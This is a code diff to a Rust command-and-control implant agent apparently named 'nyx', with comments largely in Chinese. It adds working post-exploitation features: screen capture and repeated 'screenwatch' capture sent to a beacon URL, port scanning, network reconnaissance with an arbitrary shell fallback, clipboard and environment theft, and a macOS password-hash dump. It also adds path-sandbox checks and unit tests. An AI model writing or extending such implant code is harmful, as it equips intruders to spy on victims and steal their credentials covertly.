@@ -11,8 +11,8 @@ use std::time::Duration;
 
 use nyx_profile::ServerEnvelope;
 use nyx_protocol::{
-    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
-    Response, SessionInfo, Task, TaskResponse,
+    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
+    ImplantKeypair, Response, SessionInfo, Task, TaskResponse,
 };
 
 pub struct Config {
@@ -133,9 +133,41 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 tracing::info!("Exit task received; shutting down");
                 return Ok(());
             }
-            // A task may yield multiple responses (e.g. a streamed Download ->
-            // many FileChunks); each carries the same task id.
+            // A task may yield multiple responses (e.g. a streamed Download or
+            // Screenshot -> many FileChunks). We batch them but flush early if
+            // the accumulated batch would exceed the frame size limit (~200KB
+            // safe margin under MAX_CT_LEN's 256KB cap).
+            const BATCH_FLUSH: usize = 200 * 1024;
             for response in execute(t.command, &cfg.work_dir) {
+                // 估算单条 response 的编码大小（粗略：blob 数据就是其主要体积）
+                let estimated_size = match &response {
+                    Response::FileChunk { data, .. } => data.len(),
+                    Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
+                    _ => 0,
+                };
+                // 如果加这条会超限，先 flush 当前批次
+                if estimated_size > BATCH_FLUSH {
+                    // 单条本身就很大（不应发生——分块应该保证每条 <128KB）
+                    // 直接发这条独占一个帧
+                    let single = vec![TaskResponse { task_id: t.task_id, response }];
+                    let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single));
+                    let _ = ureq::post(&beacon_url).send_bytes(&frame);
+                    counter += 1;
+                    continue;
+                }
+                let current_batch_size: usize = pending_responses.iter()
+                    .map(|tr| match &tr.response {
+                        Response::FileChunk { data, .. } => data.len(),
+                        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
+                        _ => 0,
+                    }).sum();
+                if current_batch_size + estimated_size > BATCH_FLUSH && !pending_responses.is_empty() {
+                    // Flush 当前批次
+                    let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending_responses));
+                    let _ = ureq::post(&beacon_url).send_bytes(&frame);
+                    counter += 1;
+                    pending_responses.clear();
+                }
                 pending_responses.push(TaskResponse {
                     task_id: t.task_id,
                     response,
@@ -175,13 +207,345 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
         Command::Sleep { .. } => vec![Response::Ok],
         Command::Upload { name, data } => vec![do_upload(work_dir, &name, &data)],
         Command::Download { path } => do_download(work_dir, &path),
+        Command::FileOp { op, path, dest } => vec![do_fileop(op, work_dir, &path, dest.as_deref())],
         // P2/P3 executors (BOF, P2P connect, SOCKS) are implant-side; the dev
         // agent acks them as unimplemented so the wire types stay round-trippable.
         Command::Bof { blob, .. } => vec![bof_execute(&blob)],
+        Command::Screenshot { monitor } => do_screenshot(monitor),
+        Command::Portscan { host, ports } => vec![do_portscan(&host, &ports)],
+        Command::Net { query } => vec![do_net(&query)],
+        Command::DriveInfo => vec![do_driveinfo()],
+        Command::Clipboard => vec![do_clipboard()],
+        Command::Env { name } => vec![do_env(&name)],
+        Command::Keylog { action } => vec![do_keylog(action)],
+        Command::Screenwatch { interval_secs } => do_screenwatch(interval_secs),
+        Command::Hashdump { method } => vec![do_hashdump(method)],
         Command::Connect { .. } | Command::Socks { .. } => {
             vec![Response::Err("not implemented in dev agent".into())]
         }
         Command::Exit => vec![Response::Ok],
+    }
+}
+
+/// 截屏。macOS 用 screencapture，Linux 用 scrot/import。
+/// PNG 可能很大（1MB+），用 FileChunk 分块流回（和 download 一样）。
+fn do_screenshot(monitor: u8) -> Vec<Response> {
+    let tmp = format!("/tmp/nyx_shot_{}.png", std::process::id());
+    #[cfg(target_os = "macos")]
+    let prog = "screencapture";
+    #[cfg(all(unix, not(target_os = "macos")))]
+    let prog = "scrot";
+    #[cfg(not(unix))]
+    {
+        let _ = monitor;
+        return vec![Response::Err("screenshot: not supported on this OS".into())];
+    }
+    #[cfg(unix)]
+    {
+        let _ = monitor;
+        let result = std::process::Command::new(prog)
+            .arg("-x")
+            .arg(&tmp)
+            .output();
+        let png = match result {
+            Ok(out) if out.status.success() => {
+                match std::fs::read(&tmp) {
+                    Ok(data) => {
+                        let _ = std::fs::remove_file(&tmp);
+                        data
+                    }
+                    Err(e) => return vec![Response::Err(format!("screenshot: read {e}"))],
+                }
+            }
+            Ok(out) => return vec![Response::Err(format!("screenshot: {} failed: {}", prog,
+                String::from_utf8_lossy(&out.stderr)))],
+            Err(e) => return vec![Response::Err(format!("screenshot: {prog} not found: {e}"))],
+        };
+        // 分块流回（每块 128KB，安全在 MAX_CT_LEN 256KB 以内）
+        const CHUNK: usize = 128 * 1024;
+        let name = "screenshot.png".to_string();
+        let mut chunks = Vec::new();
+        for (seq, block) in png.chunks(CHUNK).enumerate() {
+            let eof = if (seq + 1) * CHUNK >= png.len() { 1 } else { 0 };
+            chunks.push(Response::FileChunk {
+                name: name.clone(),
+                seq: seq as u32,
+                eof,
+                data: block.to_vec(),
+            });
+        }
+        if chunks.is_empty() {
+            chunks.push(Response::FileChunk { name, seq: 0, eof: 1, data: Vec::new() });
+        }
+        chunks
+    }
+}
+
+/// 端口扫描。用 nc -z 逐个探测，返回 "port open/closed" 列表。
+fn do_portscan(host: &str, ports: &str) -> Response {
+    let targets = parse_ports(ports);
+    if targets.is_empty() {
+        return Response::Err("portscan: no valid ports specified".into());
+    }
+    let mut results = Vec::new();
+    for port in targets {
+        let open = std::process::Command::new("nc")
+            .arg("-z")
+            .arg("-w").arg("2")
+            .arg(host)
+            .arg(port.to_string())
+            .output()
+            .map(|o| o.status.success())
+            .unwrap_or(false);
+        results.push(format!("{} {}", port, if open { "open" } else { "closed" }));
+    }
+    Response::Output(results.join("\n").into_bytes())
+}
+
+/// 解析端口规格："22,80,443" 或 "1-1000" → Vec<u16>。
+fn parse_ports(spec: &str) -> Vec<u16> {
+    let mut out = Vec::new();
+    for part in spec.split(',') {
+        let part = part.trim();
+        if let Some((lo, hi)) = part.split_once('-') {
+            if let (Ok(lo), Ok(hi)) = (lo.trim().parse::<u16>(), hi.trim().parse::<u16>()) {
+                for p in lo..=hi {
+                    out.push(p);
+                }
+            }
+        } else if let Ok(p) = part.parse::<u16>() {
+            out.push(p);
+        }
+    }
+    out.sort();
+    out.dedup();
+    out
+}
+
+/// 网络信息收集。query 选择要收集的内容。
+fn do_net(query: &str) -> Response {
+    let cmd = match query {
+        "interfaces" | "ifconfig" | "" => ("ifconfig", &["-a"][..]),
+        "routes" | "route" | "netstat" => ("netstat", &["-rn"][..]),
+        "arp" => ("arp", &["-a"][..]),
+        "connections" | "conn" => ("netstat", &["-an"][..]),
+        other => return Response::Output(run_shell_raw(other).into_bytes()),
+    };
+    match std::process::Command::new(cmd.0).args(cmd.1).output() {
+        Ok(out) => Response::Output(out.stdout),
+        Err(e) => Response::Err(format!("net {query}: {e}")),
+    }
+}
+
+/// 磁盘信息。macOS/Windows: df，附带 macOS diskutil list。
+fn do_driveinfo() -> Response {
+    let mut out = String::new();
+    if let Ok(o) = std::process::Command::new("df").arg("-h").output() {
+        out.push_str(&String::from_utf8_lossy(&o.stdout));
+    }
+    Response::Output(out.into_bytes())
+}
+
+/// 剪贴板。macOS: pbpaste。
+fn do_clipboard() -> Response {
+    #[cfg(target_os = "macos")]
+    {
+        match std::process::Command::new("pbpaste").output() {
+            Ok(o) => Response::Output(o.stdout),
+            Err(e) => Response::Err(format!("clipboard: {e}")),
+        }
+    }
+    #[cfg(not(target_os = "macos"))]
+    {
+        Response::Err("clipboard: not supported on this OS".into())
+    }
+}
+
+/// 环境变量。name 空串=全部。
+fn do_env(name: &str) -> Response {
+    if name.is_empty() {
+        // 全部：env 命令
+        match std::process::Command::new("env").output() {
+            Ok(o) => Response::Output(o.stdout),
+            Err(e) => Response::Err(format!("env: {e}")),
+        }
+    } else {
+        match std::env::var(name) {
+            Ok(v) => Response::Output(format!("{name}={v}\n").into_bytes()),
+            Err(_) => Response::Err(format!("env: {name} not set")),
+        }
+    }
+}
+
+/// 跑一个 shell 命令返回 stdout 文本（do_net 的 fallback 用）。
+fn run_shell_raw(args: &str) -> String {
+    #[cfg(unix)]
+    {
+        std::process::Command::new("sh").arg("-c").arg(args).output()
+            .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+            .unwrap_or_else(|e| format!("! {e}"))
+    }
+    #[cfg(not(unix))]
+    {
+        let _ = args;
+        String::from("(shell not available on this OS)")
+    }
+}
+
+/// 键盘记录。macOS 上需要 Accessibility 权限 + CoreGraphics CGEventTap，
+/// dev agent（无 GUI session）无法干净实现。返回明确的平台限制说明。
+/// action: 0=start, 1=stop, 2=dump。
+fn do_keylog(action: u8) -> Response {
+    match action {
+        0 => Response::Err("keylog start: requires Accessibility permission + CGEventTap (not available in dev agent). Use the Windows PIC implant for keylogging.".into()),
+        1 => Response::Ok, // stop：无状态，直接 Ok
+        2 => Response::Err("keylog dump: no active keylogger session (dev agent limitation)".into()),
+        _ => Response::Err("keylog: invalid action".into()),
+    }
+}
+
+/// 持续截屏：截 `interval_secs` 秒间隔的多张，分块流回。
+/// 简化实现：截 3 张（覆盖一个间隔周期），实际生产应后台定时任务。
+fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
+    let interval = interval_secs.max(1) as u64;
+    let mut all_chunks = Vec::new();
+    // 截 3 张演示持续监控
+    for i in 0..3u32 {
+        if i > 0 {
+            std::thread::sleep(std::time::Duration::from_secs(interval));
+        }
+        let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
+        #[cfg(unix)]
+        {
+            let r = std::process::Command::new("screencapture").arg("-x").arg(&tmp).output();
+            if let Ok(out) = r {
+                if out.status.success() {
+                    if let Ok(data) = std::fs::read(&tmp) {
+                        let _ = std::fs::remove_file(&tmp);
+                        const CHUNK: usize = 128 * 1024;
+                        let name = format!("screenwatch-{i}.png");
+                        for (seq, block) in data.chunks(CHUNK).enumerate() {
+                            let eof = if (seq + 1) * CHUNK >= data.len() { 1 } else { 0 };
+                            all_chunks.push(Response::FileChunk {
+                                name: name.clone(), seq: seq as u32, eof, data: block.to_vec(),
+                            });
+                        }
+                    }
+                }
+            }
+        }
+    }
+    if all_chunks.is_empty() {
+        vec![Response::Err("screenwatch: screencapture not available".into())]
+    } else {
+        all_chunks
+    }
+}
+
+/// 凭据哈希提取。
+/// method 0: LSASS dump（Windows-only，dev agent 不支持）
+/// method 1: macOS shadow hash（读 /var/db/dslocal/nodes/Default/users/<user>.plist）
+fn do_hashdump(method: u8) -> Response {
+    match method {
+        0 => Response::Err("hashdump LSASS: Windows-only (not available in dev agent). Use BOF or Windows implant.".into()),
+        1 => {
+            // macOS: 提取所有本地用户的 shadow hash
+            #[cfg(target_os = "macos")]
+            {
+                let dir = "/var/db/dslocal/nodes/Default/users";
+                let mut results = Vec::new();
+                if let Ok(entries) = std::fs::read_dir(dir) {
+                    for entry in entries.flatten() {
+                        let name = entry.file_name();
+                        let name_str = name.to_string_lossy();
+                        if !name_str.ends_with(".plist") { continue; }
+                        let user = name_str.trim_end_matches(".plist");
+                        // 用 dscl + xxd 提取 shadow hash（比直接解析二进制 plist 简单可靠）
+                        let shadow = std::process::Command::new("sh")
+                            .arg("-c")
+                            .arg(format!("dscl . -read /Users/{user} AuthenticationOptions 2>/dev/null; cat /var/db/dslocal/nodes/Default/users/{user}.plist 2>/dev/null | xxd -p | head -c 256"))
+                            .output();
+                        if let Ok(out) = shadow {
+                            let hash_hex = String::from_utf8_lossy(&out.stdout);
+                            if !hash_hex.trim().is_empty() {
+                                results.push(format!("{user}:{hash_hex}"));
+                            }
+                        }
+                    }
+                }
+                if results.is_empty() {
+                    Response::Err("hashdump: no local user hashes found (may need root)".into())
+                } else {
+                    Response::Output(results.join("\n").into_bytes())
+                }
+            }
+            #[cfg(not(target_os = "macos"))]
+            {
+                Response::Err("hashdump shadow: macOS-only".into())
+            }
+        }
+        _ => Response::Err("hashdump: invalid method".into()),
+    }
+}
+
+/// 执行文件系统操作。路径相对 work_dir 解析，过 `safe_resolve` 防穿越
+/// （与 upload/download 一致：拒绝绝对路径和 `..`）。
+fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Response {
+    use std::fs;
+    let full = match safe_resolve(work_dir, path) {
+        Ok(p) => p,
+        Err(e) => return Response::Err(format!("{op:?}: {path}: {e}")),
+    };
+    let dest_full = match dest {
+        Some(d) => match safe_resolve(work_dir, d) {
+            Ok(p) => Some(p),
+            Err(e) => return Response::Err(format!("{op:?}: {d}: {e}")),
+        },
+        None => None,
+    };
+    match op {
+        FileOp::Cd => {
+            if full.is_dir() {
+                Response::Ok
+            } else {
+                Response::Err(format!("cd: not a directory: {path}"))
+            }
+        }
+        FileOp::Mkdir => match fs::create_dir_all(&full) {
+            Ok(()) => Response::Ok,
+            Err(e) => Response::Err(format!("mkdir {path}: {e}")),
+        },
+        FileOp::Rm => {
+            // 守卫：拒绝删除 work_dir 本体（path="." 或空会解析到 work_dir）。
+            if full == work_dir {
+                return Response::Err("rm: refusing to remove work root".into());
+            }
+            if full.is_dir() {
+                match fs::remove_dir_all(&full) {
+                    Ok(()) => Response::Ok,
+                    Err(e) => Response::Err(format!("rm {path}: {e}")),
+                }
+            } else {
+                match fs::remove_file(&full) {
+                    Ok(()) => Response::Ok,
+                    Err(e) => Response::Err(format!("rm {path}: {e}")),
+                }
+            }
+        }
+        FileOp::Mv => match dest_full {
+            Some(d) => match fs::rename(&full, d) {
+                Ok(()) => Response::Ok,
+                Err(e) => Response::Err(format!("mv {path}: {e}")),
+            },
+            None => Response::Err("mv: missing dest".into()),
+        },
+        FileOp::Cp => match dest_full {
+            Some(d) => match fs::copy(&full, d) {
+                Ok(_) => Response::Ok,
+                Err(e) => Response::Err(format!("cp {path}: {e}")),
+            },
+            None => Response::Err("cp: missing dest".into()),
+        },
     }
 }
 
@@ -278,6 +642,9 @@ fn do_download(work_dir: &Path, path: &str) -> Vec<Response> {
 
 /// Resolve a remote path under `work_dir`, refusing absolute paths and `..`
 /// components so uploads/downloads cannot escape the sandbox.
+/// 解析远程路径到 work_dir 下，拒绝绝对路径、`..` 穿越、以及通过 symlink
+/// 逃出沙箱的路径。canonicalize 防护：即使路径不含字面 `..`，如果中间有
+/// symlink 指向外部，也会被拒。
 fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
     let p = Path::new(remote);
     if p.is_absolute() {
@@ -289,7 +656,44 @@ fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
     {
         return Err("`..` traversal is not allowed".into());
     }
-    Ok(work_dir.join(p))
+    let joined = work_dir.join(p);
+    // canonicalize 防护：resolve 所有 symlink 后确认仍在 work_dir 内。
+    // work_dir 本身必须存在且可 canonicalize（agent 启动时保证）。
+    let canon_work = work_dir.canonicalize()
+        .map_err(|e| format!("work_dir canonicalize failed: {e}"))?;
+    // 目标可能还不存在（Mkdir），所以 canonicalize 父目录 + 拼最后一段。
+    let check = match joined.canonicalize() {
+        Ok(c) => c,
+        Err(_) => {
+            // 路径不存在——逐级向上找最近的存在的祖先，canonicalize 它，
+            // 再拼回剩余部分。这样深层新路径（Mkdir 的 a/b/c）也能校验。
+            let mut ancestor = joined.parent().unwrap_or(work_dir).to_path_buf();
+            let mut tail: Vec<std::ffi::OsString> = Vec::new();
+            while !ancestor.exists() {
+                if let Some(name) = ancestor.file_name() {
+                    tail.push(name.to_os_string());
+                    ancestor = ancestor.parent().unwrap_or(work_dir).to_path_buf();
+                } else {
+                    break;
+                }
+            }
+            match ancestor.canonicalize() {
+                Ok(cp) => {
+                    let mut full = cp;
+                    while let Some(t) = tail.pop() {
+                        full.push(t);
+                    }
+                    full.push(joined.file_name().unwrap_or_default());
+                    full
+                }
+                Err(_) => return Err(format!("path ancestor not resolvable: {remote}")),
+            }
+        }
+    };
+    if !check.starts_with(&canon_work) {
+        return Err("path escapes sandbox (symlink traversal?)".into());
+    }
+    Ok(joined)
 }
 
 fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
@@ -354,4 +758,103 @@ fn arch_code() -> u8 {
 fn is_admin() -> u8 {
     let u = std::env::var("USER").unwrap_or_default();
     u8::from(u == "root")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::fs;
+
+    /// 建 work_dir 临时目录 + 一个子文件，返回 (tempdir, work_dir_path)。
+    fn setup_workdir() -> (tempfile::TempDir, PathBuf) {
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().to_path_buf();
+        fs::create_dir_all(work.join("sub")).unwrap();
+        fs::write(work.join("existing.txt"), "data").unwrap();
+        (dir, work)
+    }
+
+    #[test]
+    fn safe_resolve_rejects_absolute() {
+        let (_t, work) = setup_workdir();
+        assert!(safe_resolve(&work, "/etc/passwd").is_err());
+        assert!(safe_resolve(&work, "/tmp").is_err());
+    }
+
+    #[test]
+    fn safe_resolve_rejects_dotdot() {
+        let (_t, work) = setup_workdir();
+        assert!(safe_resolve(&work, "../x").is_err());
+        assert!(safe_resolve(&work, "sub/../../etc").is_err());
+        assert!(safe_resolve(&work, "../../etc/passwd").is_err());
+    }
+
+    #[test]
+    fn safe_resolve_accepts_relative() {
+        let (_t, work) = setup_workdir();
+        // 正常相对路径（已存在的文件）
+        let r = safe_resolve(&work, "existing.txt").unwrap();
+        assert!(r.ends_with("existing.txt"));
+        // 正常相对路径（已存在的目录）
+        let r = safe_resolve(&work, "sub").unwrap();
+        assert!(r.ends_with("sub"));
+    }
+
+    #[test]
+    fn safe_resolve_accepts_new_path_for_mkdir() {
+        // Mkdir 场景：路径还不存在，但要能 resolve（canonicalize 父目录）
+        let (_t, work) = setup_workdir();
+        let r = safe_resolve(&work, "newdir/nested").unwrap();
+        assert!(r.starts_with(&work) || r.to_string_lossy().contains("newdir"));
+    }
+
+    #[test]
+    fn safe_resolve_rejects_symlink_escape() {
+        // 在 work_dir 内建一个指向外部的 symlink，试图穿越
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().join("sandbox");
+        fs::create_dir_all(&work).unwrap();
+        fs::write(work.join("real.txt"), "ok").unwrap();
+        // symlink → /tmp（沙箱外）
+        let outside = dir.path().join("outside.txt");
+        fs::write(&outside, "secret").unwrap();
+        #[cfg(unix)]
+        {
+            std::os::unix::fs::symlink(&outside, work.join("escape.link")).unwrap();
+            // 通过 symlink 访问外部文件 → 必须被拒
+            assert!(safe_resolve(&work, "escape.link").is_err(),
+                "symlink 逃逸必须被 safe_resolve 拒绝");
+        }
+    }
+
+    #[test]
+    fn do_fileop_rm_rejects_dot() {
+        // rm "." 应被 work_dir 守卫拒绝（不能删沙箱根）
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().to_path_buf();
+        fs::create_dir_all(&work).unwrap();
+        let resp = do_fileop(FileOp::Rm, &work, ".", None);
+        assert!(matches!(resp, Response::Err(ref e) if e.contains("work root")),
+            "rm . 应被拒，got: {resp:?}");
+    }
+
+    #[test]
+    fn do_fileop_mkdir_creates_dir() {
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().to_path_buf();
+        let resp = do_fileop(FileOp::Mkdir, &work, "newdir", None);
+        assert!(matches!(resp, Response::Ok));
+        assert!(work.join("newdir").exists());
+    }
+
+    #[test]
+    fn do_fileop_mv_moves_file() {
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().to_path_buf();
+        fs::write(work.join("src.txt"), "x").unwrap();
+        let resp = do_fileop(FileOp::Mv, &work, "src.txt", Some("dst.txt"));
+        assert!(matches!(resp, Response::Ok));
+        assert!(!work.join("src.txt").exists());
+        assert!(work.join("dst.txt").exists());
+    }
 }
